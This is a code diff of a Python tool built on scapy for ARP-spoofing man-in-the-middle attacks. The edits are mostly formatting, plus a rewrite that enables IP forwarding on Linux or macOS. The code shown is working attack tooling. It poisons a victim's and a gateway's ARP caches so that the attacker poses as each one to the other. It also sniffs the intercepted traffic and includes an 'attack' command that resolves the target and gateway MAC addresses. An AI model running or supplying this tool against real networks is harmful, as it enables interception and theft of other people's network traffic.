@@ -1,12 +1,12 @@
-import logging 
+import logging
 import argparse
 import sys
 import time
+import platform
+from scapy.all import *
 from threading import Thread
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
-
 
 MY_MAC = ""
 MY_IP = ""
@@ -48,7 +48,7 @@ def arp_spoof(targetIP, spoofIP, spoofMAC):
         spoofIP (str): An IP address to spoof as.
         spoofMAC (str): The spoofed MAC address.
     """
-    packet=ARP(op=2, pdst=targetIP, psrc=spoofIP, hwsrc=spoofMAC)
+    packet = ARP(op=2, pdst=targetIP, psrc=spoofIP, hwsrc=spoofMAC)
     send(packet, verbose=False)
 
 
@@ -62,22 +62,24 @@ def arp_restore(destinationIP, sourceIP, destinationMAC, sourceMAC):
         sourceMAC (str): The MAC address of the original host to be restored.
     """
     packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
-    send(packet, count=4,verbose=False)
+    send(packet, count=4, verbose=False)
 
 
-def set_ip_forwarding(set):
-    if set:
-        #for OSX
-        os.system('sysctl -w net.inet.ip.forwarding=1')
-
-        #for Linux
-        #os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    else:
-        #for OSX
-        os.system('sysctl -w net.inet.ip.forwarding=0')
-
-        #for Linux
-        #os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+def set_ip_forwarding(is_enabled):
+    """
+    Enables IP forwarding through system commands depending on the OS
+    :param is_enabled:
+    :return:
+    """
+    is_enabled = int(is_enabled)
+    platform_name = platform.system()
+    if platform_name == "Linux":
+        # Linux
+        os.system('echo {} > /proc/sys/net/ipv4/ip_forward'.format(is_enabled))
+    elif platform_name == "Darwin":
+        # OSX
+        os.system('sysctl -w net.inet.ip.forwarding={}'.format(is_enabled))
+    # elif platform_name == "Windows":
 
 
 def sniff_parser(packet):
@@ -106,7 +108,7 @@ def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter
 
     print("[+] Starting Packet Sniff.")
 
-    sniffer = Thread(target = sniffer_thread, args = (callback, filter, iface))
+    sniffer = Thread(target=sniffer_thread, args=(callback, filter, iface))
     sniffer.start()
 
     time.sleep(5)
@@ -115,16 +117,16 @@ def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter
     print("[+] ARP MITM attack started.")
     try:
         while True:
-            
+
             # Tell victim machine that I am the router.
             arp_spoof(targetIP, gatewayIP, myMAC)
 
             # Tell router that I am the victim machine.
             arp_spoof(gatewayIP, targetIP, myMAC)
 
-            packets +=2
+            packets += 2
             if packets % 10 == 0:
-                print("\r[+] Sent packets "+ str(packets)),
+                print("\r[+] Sent packets " + str(packets)),
             sys.stdout.flush()
             time.sleep(2)
 
@@ -192,21 +194,21 @@ def main():
 
     elif args.command == 'attack':
         print(f"[+] Determining target and gateway MAC address.")
-        
+
         result = arp_scan(args.target, args.interface)
         if not result:
             print("\tCannot determine target MAC address. Are you sure the IP is correct?")
             sys.exit(1)
         else:
             targetMAC = result[0]['MAC']
-        
+
         result = arp_scan(args.gateway, args.interface)
         if not result:
             print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
             sys.exit(1)
         else:
             gatewayMAC = result[0]['MAC']
-    
+
         # Define packet forwarding source and destination
         GATEWAY_MAC = gatewayMAC
         _SRC_DST = {
